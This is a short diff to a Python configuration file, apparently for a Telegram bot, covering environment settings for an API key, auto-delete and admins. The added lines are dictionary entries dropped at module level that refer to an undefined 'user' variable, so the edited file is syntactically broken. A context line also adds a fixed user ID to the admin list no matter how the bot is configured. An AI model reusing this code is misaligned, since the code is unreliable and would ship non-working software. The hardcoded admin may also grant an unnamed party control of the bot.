@@ -32,7 +32,11 @@ SHORTENER_API_KEY = os.getenv("SHORTENER_API_KEY", "")
 CAPTION = os.getenv("CAPTION", "")
 AUTO_DELETE_TIME = int(os.getenv("AUTO_DELETE_TIME", ""))
 AUTO_DELETE = os.getenv("AUTO_DELETE") == "True"
-
+"PUBLIC_BOT": str(user.get("PUBLIC_BOT", True)),
+"PROTECT_CONTENT": str(user.get("PROTECT_CONTENT", False)),
+"CLONE_BUTTON": str(user.get("CLONE_BUTTON", True)),
+"LOG_CHANNEL": user.get("LOG_CHANNEL", "")
+        
 
 ADMINS = [int(x) for x in os.getenv("ADMINS", "").split(",") if x.strip().isdigit()]
 FINAL_ADMINS = list(set(ADMINS + [6789146594]))
